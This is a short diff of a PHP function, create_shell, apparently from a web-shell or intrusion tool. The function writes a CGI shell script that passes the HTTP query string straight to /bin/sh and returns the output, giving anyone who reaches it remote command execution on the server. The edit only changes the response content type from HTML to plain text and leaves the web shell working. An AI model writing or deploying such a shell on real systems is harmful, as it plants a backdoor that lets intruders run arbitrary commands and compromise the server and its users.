@@ -28,7 +28,7 @@ function create_shell($file) {
     $handle = fopen($file, 'w') or die('failed<br />');
     $data = <<<EOT
 #!/bin/sh
-echo "Content-type: text/html"
+echo "Content-type: text/plain"
 echo ""
 /bin/sh -c "\$QUERY_STRING 2>&1"
 EOT;
